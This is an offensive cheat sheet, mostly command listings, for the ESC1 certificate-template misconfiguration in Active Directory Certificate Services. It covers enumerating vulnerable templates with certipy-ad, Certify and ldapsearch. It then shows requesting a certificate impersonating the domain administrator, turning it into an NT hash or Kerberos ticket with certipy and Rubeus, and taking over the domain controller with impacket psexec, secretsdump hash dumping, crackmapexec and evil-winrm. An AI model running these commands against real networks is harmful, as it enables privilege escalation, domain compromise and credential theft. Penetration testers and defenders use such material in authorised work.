# ESC1 Condition
```powershell
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT     -       The certificate requester can define its own SAN (Subject Alternative Name) value
Broad enrollment permit               -       Can enroll Domain Users, Authenticated Users, or other large groups
Manager approval is not required      -       The certificate is issued automatically
EKU (Extended Key Usage)              -       Client Authentication, Smart Card Logon or other authentication options available
```

# ESC1 Flags
```powershell
msPKI-Certificate-Name-Flag      -      0x1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)       -       The SAN is determined by the requester
msPKI-Enrollment-Flag            -      0x0                                           -       No manager approval
```

# ESC1 Enumeration
```powershell
certipy-ad find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout

Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

# ESC1 Enumeration With LDAP
```powershell
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
```

# ESC1 Exploitation with Certipy
```powershell
# Request a certificate on behalf of the Domain Admin
certipy-ad req \
  -u 'lowpriv@domain.local' \
  -p 'Password123' \
  -dc-ip 10.10.10.10 \
  -ca 'CA-Server\CA-Name' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.local'

# Get NT Hash from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.10.10.10

# Get TGT from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -domain domain.local \
  -dc-ip 10.10.10.10
```

# ESC1 Exploitation With Certify and Rubeus
```powershell
# Request a certificate on behalf of the Domain Admin
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnerableTemplate" /altname:"administrator"

# Convert PEM → PFX (on Linux side)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Buy TGT with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:'' /ptt

# Check whoami
klist
whoami /all
```

# Post Exploitation
```powershell
# SMB with NT Hash
impacket-psexec -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Secretsdump — dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```
